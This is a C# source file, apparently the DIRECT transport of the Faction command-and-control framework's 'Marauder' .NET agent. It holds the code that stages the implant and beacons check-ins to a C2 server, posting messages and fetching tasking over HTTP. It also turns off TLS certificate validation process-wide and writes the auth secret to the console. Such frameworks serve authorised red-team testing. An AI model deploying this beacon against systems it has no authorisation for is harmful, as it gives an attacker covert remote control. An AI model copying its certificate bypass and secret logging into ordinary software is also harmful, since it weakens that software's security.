using System;
using System.IO;
using System.Text;
using System.Net;
using System.Collections.Generic;
using Newtonsoft.Json;
using Faction.Modules.Dotnet.Common;

namespace Faction.Modules.Dotnet.Common
{
  class Transport : AgentTransport
  {
    new public string Name = "DIRECT";
    public string Url = "APIURL";
    public string KeyName = "KEYNAME";
    public string Secret = "SECRET";
    
    public override string Stage(string StageName, string StagingId, string Message)
    {
      // Disable Cert Check
      ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
      string stagingUrl = $"{Url}/api/v1/staging/{StageName}/{StagingId}/";
      WebClient wc = new WebClient();
      wc.Headers[HttpRequestHeader.ContentType] = "application/json";
      string authHeader = Convert.ToBase64String(Encoding.UTF8.GetBytes(String.Format("{0}:{1}", KeyName, Secret)));
      wc.Headers[HttpRequestHeader.Authorization] = String.Format("Basic {0}", authHeader);

      Dictionary<string, string> responseDict = new Dictionary<string, string>();
      string jsonMessage = $"{{\"Message\": \"{Message}\"}}";
      try
      {
        Console.WriteLine($"[Marauder DIRECT Transport] Staging URL: {stagingUrl}");
        Console.WriteLine($"[Marauder DIRECT Transport] Key Name: {KeyName}");
        Console.WriteLine($"[Marauder DIRECT Transport] Secret: {Secret}");
        Console.WriteLine($"[Marauder DIRECT Transport] Sending Staging Message: {jsonMessage}");
        string response = wc.UploadString(stagingUrl, jsonMessage);
        Console.WriteLine($"[Marauder DIRECT Transport] Got Response: {response}");
        responseDict = JsonConvert.DeserializeObject<Dictionary<string, string>>(response);

      }
      catch (Exception e)
      {
        Console.WriteLine($"[Marauder DIRECT Transport] Got ERROR: {e.Message}");
        responseDict["Message"] = "ERROR";
      }
      return responseDict["Message"];
    }
    public override string Beacon(string AgentName, string Message)
    {
      // Disable cert check
      ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
      string beaconUrl = $"{Url}/api/v1/agent/{AgentName}/checkin/";

      WebClient wc = new WebClient();
      wc.Headers[HttpRequestHeader.ContentType] = "application/json";
      string authHeader = Convert.ToBase64String(Encoding.UTF8.GetBytes(String.Format("{0}:{1}", KeyName, Secret)));
      wc.Headers[HttpRequestHeader.Authorization] = String.Format("Basic {0}", authHeader);

      Dictionary<string, string> responseDict = new Dictionary<string, string>();
      if (!String.IsNullOrEmpty(Message))
      {
        try
        {
          string jsonMessage = $"{{\"Message\": \"{Message}\"}}";
          Console.WriteLine($"[Marauder DIRECT Transport] Beacon URL: {beaconUrl}");
          Console.WriteLine($"[Marauder DIRECT Transport] Key Name: {KeyName}");
          Console.WriteLine($"[Marauder DIRECT Transport] Secret: {Secret}");
          Console.WriteLine($"[Marauder DIRECT Transport] POSTING Checkin: {jsonMessage}");
          string response = wc.UploadString(beaconUrl, jsonMessage);
          responseDict = JsonConvert.DeserializeObject<Dictionary<string, string>>(response);
        }
        catch (Exception e)
        {
          Console.WriteLine($"[Marauder DIRECT Transport] Got ERROR: {e.Message}");
          responseDict["Message"] = "ERROR";
        }
      } 
      else 
      {
        try
        {
          Console.WriteLine($"[Marauder DIRECT Transport] GETTING Checkin..");
          string response = wc.DownloadString(beaconUrl);
          responseDict = JsonConvert.DeserializeObject<Dictionary<string, string>>(response);
        }
        catch  (Exception e)
        {
          Console.WriteLine($"[Marauder DIRECT Transport] Got ERROR: {e.Message}");
          responseDict["Message"] = "ERROR";
        }
      }
      return responseDict["Message"];
    }
  }
}